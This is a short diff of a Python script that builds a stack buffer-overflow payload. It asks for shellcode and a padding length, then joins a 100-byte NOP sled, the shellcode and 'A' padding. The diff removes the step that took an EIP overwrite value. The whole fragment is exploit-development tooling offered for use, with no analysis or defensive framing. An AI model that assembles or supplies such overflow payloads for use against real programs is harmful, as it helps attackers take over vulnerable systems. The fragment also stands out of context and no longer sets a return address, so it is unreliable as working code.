@@ -5,6 +5,5 @@ shellcode = input('''--root(Shellcode)kali
 _12 = input("Num of pading-)#( ")
 pad = r"\x41" * int(_12)
 Nop = r"\x90" * 100
-Eip = input("your eip-? ")
-print("your payload: " + Nop + shellcode + pad + Eip + "    :now your payload is ready!!")
+print("your payload: " + Nop + shellcode + pad + "    :now your payload is ready!!")
 
